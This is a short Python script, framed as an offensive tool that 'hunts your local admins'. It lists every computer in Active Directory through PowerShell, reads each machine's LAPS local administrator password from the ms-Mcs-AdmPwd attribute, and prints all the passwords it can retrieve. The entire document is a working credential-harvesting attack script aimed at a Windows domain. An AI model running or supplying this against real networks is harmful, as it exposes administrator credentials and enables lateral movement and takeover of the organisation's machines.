import subprocess


print("Artemis, the Goddess who hunts your local admins!")
p = subprocess.Popen(["powershell.exe", "Import-Module ActiveDirectory; Get-ADComputer -Filter * | Select-Object -ExpandProperty Name"], stdout=subprocess.PIPE)
output, error = p.communicate()
computers = output.decode().strip().split('\r\n')


results = []

for computer in computers:

    p = subprocess.Popen(["powershell.exe", f"Get-ADComputer -Identity {computer} -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd"], stdout=subprocess.PIPE)
    output, error = p.communicate()
    password = output.decode().strip()

    if password != "":

        results.append({"ComputerName": computer, "Password": password})

results.sort(key=lambda x: x["ComputerName"])

for result in results:
    print(f"{result['ComputerName']}\t{result['Password']}")


print("The hunt was fruitful!")